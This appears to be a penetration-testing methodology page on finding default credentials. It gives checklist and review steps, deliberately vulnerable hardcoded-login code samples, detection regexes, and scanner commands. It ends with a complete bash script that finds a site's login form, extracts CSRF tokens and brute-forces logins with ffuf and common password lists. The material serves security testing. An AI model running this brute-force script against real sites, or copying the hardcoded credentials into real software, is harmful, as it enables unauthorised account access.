# Default Credentials

## Check List

* [ ] Determine whether the application has any user accounts with default passwords.
* [ ] Review whether new user accounts are created with weak or predictable passwords.

## Methodology&#x20;

### Black Box

#### Default Credentials

{% stepper %}
{% step %}
For the first step, we can view default usernames and passwords in the list of these lists using GitHub repositories
{% endstep %}

{% step %}
Then, using the next command related to the Nmap tool and related to the switch, we execute this vulnerability on the target and identify the existence of this vulnerability
{% endstep %}

{% step %}
And by using the next commands that are related to the tools, we can execute on the target and the existence of this damage Identify the vulnerability on the target if there is a Default Credentials vulnerability on the login page or not
{% endstep %}

{% step %}
And then we can automatically find the authentication form on the site using the written script, and then it finds the username and password forms, and it can brute force a list of password lists and default usernames using the FFUF tool
{% endstep %}
{% endstepper %}

***

### White Box

#### Use of Default Credentials

{% stepper %}
{% step %}
Map the entire system using Burp Suite and identify all entry points, administrative panels, APIs, management services, agents, consoles, setup pages, and initial configuration interfaces
{% endstep %}

{% step %}
Search documentation, installation files, Docker Compose files, Kubernetes manifests, Helm charts, configuration files, and source code for default usernames and passwords

{% tabs %}
{% tab title="C#" %}
```csharp
public static class DefaultUsers
{
    public const string AdminUsername = "admin";
    public const string AdminPassword = "admin";

    public const string ServiceUsername = "service";
    public const string ServicePassword = "service123";
}
```
{% endtab %}

{% tab title="Java" %}
```java
public final class DefaultUsers
{
    public static final String AdminUsername = "admin";
    public static final String AdminPassword = "admin";

    public static final String ServiceUsername = "service";
    public static final String ServicePassword = "service123";
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class DefaultUsers
{
    public const AdminUsername = "admin";
    public const AdminPassword = "admin";

    public const ServiceUsername = "service";
    public const ServicePassword = "service123";
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
class DefaultUsers
{
    static AdminUsername = "admin";
    static AdminPassword = "admin";

    static ServiceUsername = "service";
    static ServicePassword = "service123";
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Then locate the Controller, Service, or Authentication Provider responsible for authentication and determine whether default accounts are hardcoded within the application logic

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regexp
(admin|administrator|root|service|agent|guest|test|default|demo|support).{0,100}(password|passwd|pwd|secret)|Username\s*=\s*"[^"]+"[\s\S]{0,200}Password\s*=\s*"[^"]+"|ValidateUser\s*\([^)]*\)[\s\S]{0,300}(==|Equals)\s*"[^"]+"
```
{% endtab %}

{% tab title="Java" %}
```regexp
(admin|administrator|root|service|agent|guest|test|default|demo|support).{0,100}(password|passwd|pwd|secret)|username\s*=\s*"[^"]+"[\s\S]{0,200}password\s*=\s*"[^"]+"|authenticate\s*\([^)]*\)[\s\S]{0,300}(==|equals)\s*\(?\s*"[^"]+"
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(admin|administrator|root|service|agent|guest|test|default|demo|support).{0,100}(password|passwd|pwd|secret)|\$[a-zA-Z0-9_]*(user|username).{0,100}=\s*['"][^'"]+['"][\s\S]{0,200}\$[a-zA-Z0-9_]*(pass|password).{0,100}=\s*['"][^'"]+['"]|if\s*\([^)]*(username|password).{0,200}==.{0,100}['"][^'"]+['"]
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(admin|administrator|root|service|agent|guest|test|default|demo|support).{0,100}(password|passwd|pwd|secret)|username\s*:\s*['"][^'"]+['"][\s\S]{0,200}password\s*:\s*['"][^'"]+['"]|if\s*\([^)]*(username|password).{0,200}(===|==).{0,100}['"][^'"]+['"]
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection(Linux))**

{% tabs %}
{% tab title="C#" %}
```regexp
(admin|administrator|root|service|agent|guest|test|default|demo|support).{0,100}(password|passwd|pwd|secret)|Username\s*=\s*"[^"]+".{0,200}Password\s*=\s*"[^"]+"|ValidateUser\s*\([^)]*\).{0,300}(==|Equals)\s*"[^"]+"
```
{% endtab %}

{% tab title="Java" %}
```regexp
(admin|administrator|root|service|agent|guest|test|default|demo|support).{0,100}(password|passwd|pwd|secret)|username\s*=\s*"[^"]+".{0,200}password\s*=\s*"[^"]+"|authenticate\s*\([^)]*\).{0,300}(==|equals)\s*\(?\s*"[^"]+"
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(admin|administrator|root|service|agent|guest|test|default|demo|support).{0,100}(password|passwd|pwd|secret)|\$[a-zA-Z0-9_]*(user|username).{0,100}=\s*['"][^'"]+['"].{0,200}\$[a-zA-Z0-9_]*(pass|password).{0,100}=\s*['"][^'"]+['"]|if\s*\([^)]*(username|password).{0,200}==.{0,100}['"][^'"]+['"]
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(admin|administrator|root|service|agent|guest|test|default|demo|support).{0,100}(password|passwd|pwd|secret)|username\s*:\s*['"][^'"]+['"].{0,200}password\s*:\s*['"][^'"]+['"]|if\s*\([^)]*(username|password).{0,200}(===|==).{0,100}['"][^'"]+['"]
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public bool ValidateUser(string username, string password)
{
    if (username == "admin" &&
        password == "admin")
    {
        return true;
    }

    return false;
}
```
{% endtab %}

{% tab title="Java" %}
```java
public boolean validateUser(String username, String password)
{
    if (username.equals("admin") &&
        password.equals("admin"))
    {
        return true;
    }

    return false;
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function ValidateUser(string $username, string $password)
{
    if ($username == "admin" &&
        $password == "admin")
    {
        return true;
    }

    return false;
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
function validateUser(username, password)
{
    if (username == "admin" &&
        password == "admin")
    {
        return true;
    }

    return false;
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
In the source code, search for the Initial Setup or First Run Wizard mechanism and determine whether initial accounts are automatically created during installation

{% tabs %}
{% tab title="C#" %}
```csharp
public void SeedDefaultAdministrator()
{
    if (!_context.Users.Any())
    {
        _context.Users.Add(new User
        {
            Username = "admin",
            Password = Hash("admin"),
            Role = "Administrator"
        });

        _context.SaveChanges();
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
public void seedDefaultAdministrator()
{
    if (_context.getUsers().isEmpty())
    {
        User user = new User();
        user.setUsername("admin");
        user.setPassword(Hash("admin"));
        user.setRole("Administrator");

        _context.getUsers().add(user);
        _context.saveChanges();
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function SeedDefaultAdministrator()
{
    if (!$this->_context->Users->any())
    {
        $this->_context->Users->add(new User([
            "Username" => "admin",
            "Password" => Hash("admin"),
            "Role" => "Administrator"
        ]));

        $this->_context->saveChanges();
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
function seedDefaultAdministrator()
{
    if (!_context.Users.length)
    {
        _context.Users.push({
            Username: "admin",
            Password: Hash("admin"),
            Role: "Administrator"
        });

        _context.saveChanges();
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Review the logic responsible for creating initial users, database seeds, and migrations, and determine whether the credentials are static, predictable, or shared across all installations

{% tabs %}
{% tab title="C#" %}
```csharp
protected override void Seed(AppDbContext context)
{
    context.Users.Add(
        new User
        {
            Username = "administrator",
            PasswordHash = Hash("P@ssw0rd")
        }
    );

    context.SaveChanges();
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Override
protected void seed(AppDbContext context)
{
    User user = new User();
    user.setUsername("administrator");
    user.setPasswordHash(Hash("P@ssw0rd"));

    context.getUsers().add(user);

    context.saveChanges();
}
```
{% endtab %}

{% tab title="PHP" %}
```php
protected function Seed(AppDbContext $context)
{
    $context->Users->add(
        new User([
            "Username" => "administrator",
            "PasswordHash" => Hash("P@ssw0rd")
        ])
    );

    $context->saveChanges();
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
function seed(context)
{
    context.Users.push({
        Username: "administrator",
        PasswordHash: Hash("P@ssw0rd")
    });

    context.saveChanges();
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Search application settings files, sample files, backup files, templates, and configuration files for default credentials

```xml
<authentication>
    <username>admin</username>
    <password>admin123</password>
</authentication>
```
{% endstep %}

{% step %}
For automatically created services (API Users, Service Accounts, Agents, Database Accounts, Integration Accounts), determine whether the default password is changed after installation

{% tabs %}
{% tab title="C#" %}
```csharp
var serviceAccount = new ServiceAccount
{
    Username = "agent",
    Password = "agent123"
};

_context.ServiceAccounts.Add(serviceAccount);
```
{% endtab %}

{% tab title="Java" %}
```java
ServiceAccount serviceAccount = new ServiceAccount();
serviceAccount.setUsername("agent");
serviceAccount.setPassword("agent123");

_context.getServiceAccounts().add(serviceAccount);
```
{% endtab %}

{% tab title="PHP" %}
```php
$serviceAccount = new ServiceAccount();
$serviceAccount->Username = "agent";
$serviceAccount->Password = "agent123";

$this->_context->ServiceAccounts->add($serviceAccount);
```
{% endtab %}

{% tab title="Node.js" %}
```js
const serviceAccount = new ServiceAccount();
serviceAccount.Username = "agent";
serviceAccount.Password = "agent123";

_context.ServiceAccounts.add(serviceAccount);
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Review the login logic and determine whether the application forces users to change the default password upon first login

{% tabs %}
{% tab title="C#" %}
```csharp
if(user.IsUsingDefaultPassword)
{
    return Redirect("/ChangePassword");
}
```
{% endtab %}

{% tab title="Java" %}
```java
if(user.isUsingDefaultPassword())
{
    return Redirect("/ChangePassword");
}
```
{% endtab %}

{% tab title="PHP" %}
```php
if($user->IsUsingDefaultPassword)
{
    return Redirect("/ChangePassword");
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
if(user.IsUsingDefaultPassword)
{
    return Redirect("/ChangePassword");
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Using the identified default credentials, review the authentication process for panels, APIs, management services, and system accounts, and determine whether access is possible without changing the credentials
{% endstep %}
{% endstepper %}

***

## Cheat Sheet

### Vendor Default Credentials

#### Default Creds

{% embed url="https://github.com/many-passwords/many-passwords" %}

{% embed url="https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv" %}

{% embed url="https://many-passwords.github.io/" %}

{% embed url="https://crackstation.net/" %}

{% embed url="https://haveibeenpwned.com/Passwords" %}

{% embed url="https://cirt.net/passwords" %}

#### [Nmap](https://github.com/nnposter/nndefaccts)

```bash
sudo nmap -p80,443 --mtu 5000 --script http-default-accounts $WEBSITE
```

### Organization Default Passwords

{% embed url="https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials" %}

#### [defaultcreds-cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)

```bash
creds search $VENDOR
```

#### [Nuclei](https://github.com/projectdiscovery/nuclei-templates/tree/main/http/default-logins)

```bash
nuclei -u $WEBSITE -tags default-login
```

### Application Generated Default Passwords

#### [CeWL](https://github.com/digininja/CeWL)

```bash
cewl $WEBSITE --header "Cookie: $COOKIE" -d 5 -m 4
```

#### [Crunch](https://sourceforge.net/projects/crunch-wordlist/)

{% hint style="info" %}
`-t` = Password Pattern

`@` = Lowercase Keywords

`,` = Uppercase Keywords

`%` = Digits

`^` = Meta Characters

Example Result: `abcompany12`
{% endhint %}

```bash
crunch 8 12 -t @@company%% -o /tmp/passlist.txt
```

#### [FFUF](https://github.com/ffuf/ffuf)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano default-bruteforce.sh
```

```bash
#!/bin/bash

# Config & Colors
RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
color_print() { printf "${!1}%b${RESET}\n" "$2"; }

# Root Check
[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT."; exit 1; }

# Input Check
if [ $# -lt 1 ]; then
    echo "Usage: $0 <domain.com>"
    exit 1
fi

URL="$1"
USERLIST="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
PASSLIST="/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
DEPS="git seclists golang ffuf"

# Install Packages
for pkg in $DEPS; do
    if ! dpkg -s "$pkg" &>/dev/null; then
        color_print YELLOW "[!] Installing $pkg..."
        apt install -y "$pkg"
    fi
done

# Install Katana
if ! command -v katana &>/dev/null; then
    color_print GREEN "[*] Installing katana ..."
    go env -w GO111MODULE=on
    go env -w GOPROXY=https://goproxy.cn,direct
    go install github.com/projectdiscovery/katana/cmd/katana@latest;sudo ln -fs ~/go/bin/katana /usr/bin/katana
fi

# Find Login Page
LOGIN=$(katana -u "$URL" -depth 3 -silent | \
grep -iE "/(login|signin|sign-in|auth|user/login|admin/login|my-account|account|wp-login\.php)(/)?$" | \
grep -viE "lost-password|reset|forgot|register|signup|signout|logout|\.(js|css|jpg|png|gif|svg|ico)$" | \
sed 's:[/?]*$::' | sed 's:$:/:' | head -n 1)

if [ -z "$LOGIN" ]; then
    echo "[!] No login page found. Exiting."
    exit 1
fi

# Fetch HTML
HTML=$(curl -s "$LOGIN")
FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)

# CAPTCHA / reCAPTCHA Check
CAPTCHA_KEYWORDS="g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"
if echo "$HTML" | grep -qiE "$CAPTCHA_KEYWORDS"; then
    echo "[!] CAPTCHA detected on login page. Brute-force aborted."
    exit 1
fi

# Extract Form Action and Method
ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
[ -z "$ACTION" ] && ACTION="$LOGIN"

METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
[ -z "$METHOD" ] && METHOD="post"

if [[ "$ACTION" == /* ]]; then
    BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
elif [[ "$ACTION" =~ ^https?:// ]]; then
    FULL_ACTION="$ACTION"
else
    BASE_URL=$(echo "$LOGIN" | sed 's|\(https\?://.*/\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
fi

# Extract Username & Password Ffiles
USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')

[ -z "$USERNAME_FIELD" ] && USERNAME_FIELD="username"
[ -z "$PASSWORD_FIELD" ] && PASSWORD_FIELD="password"

# CSRF Token Extration
CSRF_FIELD=""
CSRF_VALUE=""

HIDDEN_INPUTS=$(echo "$FORM" | grep -oiP '<input[^>]+type=["'\'']?hidden["'\'']?[^>]*>')
while read -r INPUT; do
    NAME=$(echo "$INPUT" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+')
    VALUE=$(echo "$INPUT" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+')
    if [[ "$NAME" =~ csrf|token|nonce|authenticity|verification ]]; then
        CSRF_FIELD="$NAME"
        CSRF_VALUE="$VALUE"
        break
    fi
done <<< "$HIDDEN_INPUTS"

if [ -z "$CSRF_FIELD" ] && [ -n "$HIDDEN_INPUTS" ]; then
    CSRF_FIELD=$(echo "$HIDDEN_INPUTS" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+' | head -1)
    CSRF_VALUE=$(echo "$HIDDEN_INPUTS" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+' | head -1)
fi

# Prepre POST Data
DATA="${USERNAME_FIELD}=FUZZ1&${PASSWORD_FIELD}=FUZZ2"
[ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"

# Extract Cookies
COOKIES=$(curl -s -I "$URL" \
  | grep -i '^Set-Cookie:' \
  | sed -E 's/^Set-Cookie: //I' \
  | cut -d';' -f1 \
  | grep -i 'PHPSESSID')

# Extract only domain and port
HOST=$(echo "$URL" | sed -E 's~^https?://([^/]+).*~\1~')

# Headers
HEADERS=(
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0"
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
  -H "Accept-Language: en-US,fa-IR;q=0.5"
  -H "Accept-Encoding: gzip, deflate"
  -H "Content-Type: application/x-www-form-urlencoded"
  -H "Origin: $URL"
  -H "Sec-GPC: 1"
  -H "Connection: keep-alive"
  -H "Referer: $LOGIN"
  -H "Cookie: $COOKIES"
  -H "Upgrade-Insecure-Requests: 1"
  -H "Priority: u=0, i"
)

# Run FFUF
if [[ "$METHOD" == "get" ]]; then
    FFUF_URL="${FULL_ACTION}?${DATA}"
    ffuf -u "$FFUF_URL" \
         -w "$USERLIST:FUZZ1" \
         -w "$PASSLIST:FUZZ2" \
         -X GET \
         -ac -c -r \
         -mc 200 \
         "${HEADERS[@]}"
else
    ffuf -u "$FULL_ACTION" \
         -w "$USERLIST:FUZZ1" \
         -w "$PASSLIST:FUZZ2" \
         -X POST \
         -d "$DATA" \
         -ac -c -r \
         -mc 200 \
         "${HEADERS[@]}"
fi
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x default-bruteforce.sh;sudo ./default-bruteforce.sh $WEBSITE
```
